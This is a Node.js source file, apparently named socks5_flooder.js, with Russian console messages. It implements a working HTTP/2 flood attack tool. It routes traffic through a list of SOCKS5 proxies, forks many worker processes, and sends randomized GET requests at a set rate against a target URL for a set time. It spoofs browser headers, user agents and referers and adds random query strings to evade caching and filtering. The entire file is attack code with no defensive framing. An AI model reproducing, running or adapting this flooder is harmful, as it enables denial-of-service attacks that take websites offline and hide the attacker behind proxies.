const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksClient } = require("socks");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function () {});

if (process.argv.length < 7) {
    console.log(`Использование: node socks5_flooder.js <target> <time> <rate> <threads> <proxyfile> [--log]`);
    console.log(`--log — включить логирование статус-кодов ответов`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    log: process.argv.includes("--log")  // Проверяем наличие флага
};

var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().replace(/\r/g, '').split('\n').filter(Boolean);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.log(`[Master] Цель: ${args.target}`);
    console.log(`[Master] Прокси: ${proxies.length} загружено`);
    console.log(`[Master] Потоков: ${args.threads} | Rate: ${args.Rate}/s на поток`);
    console.log(`[Master] Логирование статусов: ${args.log ? "ВКЛЮЧЕНО" : "выключено"}`);
    console.log(`[Master] Запуск атаки на ${args.time} секунд...\n`);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}

class NetSocket {
    constructor() {}

    SOCKS5(options, callback) {
        const proxyParts = options.proxy.replace('socks5://', '').split(':');
        const socksOptions = {
            proxy: {
                host: proxyParts[0],
                port: parseInt(proxyParts[1]),
                type: 5
            },
            command: 'connect',
            destination: {
                host: options.address.split(':')[0],
                port: 443
            },
            timeout: options.timeout || 8000
        };

        SocksClient.createConnection(socksOptions, (err, info) => {
            if (err || !info?.socket) {
                return callback(undefined, err || "no socket");
            }
            const connection = info.socket;
            connection.setKeepAlive(true, 60000);
            callback(connection, undefined);
        });
    }
}

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = [
    "en-US,en;q=0.9", "en-GB,en;q=0.8", "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
];

const referers = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "", "https://www.yahoo.com/"];

const Header = new NetSocket();

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({length}, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
}

function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-mode": randomElement(fetch_mode),
        "upgrade-insecure-requests": "1"
    };

    const ref = randomElement(referers);
    if (ref) headers["referer"] = ref;

    if (Math.random() > 0.5) headers["dnt"] = "1";

    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr || !proxyAddr.includes(":")) return;

    const proxyOptions = {
        proxy: proxyAddr,
        address: parsedTarget.host + ":443",
        timeout: 8000
    };

    Header.SOCKS5(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 30,
                initialWindowSize: 65535,
                enablePush: false,
            },
            maxSessionMemory: 32000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        let IntervalAttack = null;

        client.on("connect", () => {
            IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const headers = buildHeaders();
                    const path = headers[":path"];
                    const request = client.request(headers);

                    request.on("response", (respHeaders) => {
                        const status = respHeaders[":status"] || "???";
                        if (args.log) {
                            console.log(`[PID ${process.pid}] ${proxyAddr} → ${status} ${path}`);
                        }
                        request.close();
                        request.destroy();
                    });

                    request.on("error", () => {
                        if (args.log) {
                            console.log(`[PID ${process.pid}] ${proxyAddr} → ERROR ${path}`);
                        }
                        request.destroy();
                    });

                    request.end();
                }
            }, 1000);
        });

        const cleanup = () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        };

        client.on("close", cleanup);
        client.on("error", cleanup);
        tlsConn.on("error", cleanup);
        tlsConn.on("end", cleanup);
    });
}

const KillScript = () => {
    console.log("\n[Flooder] Атака завершена по таймеру.");
    process.exit(0);
};

setTimeout(KillScript, args.time * 1000);
